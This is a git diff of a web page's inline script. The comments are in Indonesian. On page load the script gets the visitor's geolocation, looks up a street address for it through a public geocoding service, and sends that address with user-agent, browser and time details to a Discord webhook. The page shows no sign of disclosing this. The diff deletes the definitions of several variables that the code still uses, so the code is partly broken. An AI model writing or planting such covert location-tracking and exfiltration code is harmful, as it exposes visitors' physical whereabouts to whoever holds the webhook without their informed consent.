@@ -47,28 +47,40 @@
         background-color: #2980b9;
     }
 </style>    
-    <script>document.addEventListener('DOMContentLoaded', function() {
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
         const container = document.querySelector('.container');
         container.classList.add('animated');
     });
-        // Minta izin untuk akses geolokasi
-navigator.geolocation.getCurrentPosition(function(position) {
-    var latitude = position.coords.latitude;
-    var longitude = position.coords.longitude;
-    var locationInfo = "Lokasi pengunjung: " + latitude + ", " + longitude;
+    // Minta izin untuk akses geolokasi
+navigator.geolocation.getCurrentPosition(
+    async function(position) {
+        var latitude = position.coords.latitude;
+        var longitude = position.coords.longitude;
+        var locationInfo = await getLocationInfo(latitude, longitude);
+        sendLog(locationInfo);
+    },
+    function(error) {
+        var errorMessage = "Gagal mendapatkan lokasi pengunjung.";
+        sendLog(errorMessage);
+    }
+);
 
-    // Informasi perangkat
-    var userAgent = navigator.userAgent;
-    var deviceInfo = "User Agent: " + userAgent;
+async function getLocationInfo(latitude, longitude) {
+    var apiUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`;
+    var response = await fetch(apiUrl);
+    var data = await response.json();
 
-    // Informasi browser
-    var browserName = navigator.appName;
-    var browserVersion = navigator.appVersion;
-    var browserInfo = "Browser: " + browserName + " " + browserVersion;
+    if (data && data.display_name) {
+        return "Lokasi detail: " + data.display_name;
+    } else {
+        return "Informasi lokasi detail tidak tersedia.";
+    }
+}
 
-    // Informasi waktu
-    var currentDateTime = new Date();
-    var dateTimeInfo = "Waktu: " + currentDateTime.toString();
+function sendLog(locationInfo) {
+    // Informasi perangkat, browser, dan waktu
+    // ...
 
     // Gabungkan semua informasi
     var logMessage = locationInfo + "\n" + deviceInfo + "\n" + browserInfo + "\n" + dateTimeInfo;
@@ -88,7 +100,8 @@ navigator.geolocation.getCurrentPosition(function(position) {
     xhr.send(JSON.stringify(message));
 
     console.log("Log dikirim ke Discord:", logMessage);
-});
+}
+
 
     </script>
 </body>
